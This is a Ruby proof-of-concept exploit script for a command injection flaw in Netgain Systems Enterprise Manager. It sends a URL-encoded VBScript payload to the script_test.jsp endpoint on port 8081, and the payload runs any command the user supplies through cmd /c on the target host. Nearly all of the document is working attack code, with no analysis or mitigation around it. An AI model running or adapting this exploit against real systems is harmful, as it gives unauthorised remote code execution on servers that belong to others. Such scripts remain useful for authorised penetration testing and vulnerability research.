#!/usr/bin/env ruby 
# Netgain Systems Enterprise Manager script_test Command Injection Remote Code Execution Vulnerability (Win32)
require 'rex'

host = ARGV[0]
cmd  = ARGV[1] || "calc.exe"

def usage
	puts "[*] #{$0} <host> [command]"
	exit
end

usage if ARGV.size < 1

sock = Rex::Proto::Http::Client.new(host, port = "8081", context = {}, ssl = false)

data = "type=vbs&content=Dim+objShell%0ASet+objShell+%3D+WScript.CreateObject+(%22WScript.shell%22)%0AobjShell.run+%22cmd+%2Fc+#{cmd}%22%0ASet+objShell+%3D+Nothing&args=&count=0&ip=localhost"

req = sock.request_cgi(
	{
		'uri'   => "/u/jsp/designer/script_test.jsp",
		'version' => '1.0',
		'method' => 'POST',
		'data' => data,
	})
begin
	sock.send_request(req)
	data = sock.read_response()
	if data and data.code == 200
		puts "[*] Command Executed..."
	else
		puts "[!] Failed..."
	end
rescue => e
	puts "[!] #{e.to_s}..."
end
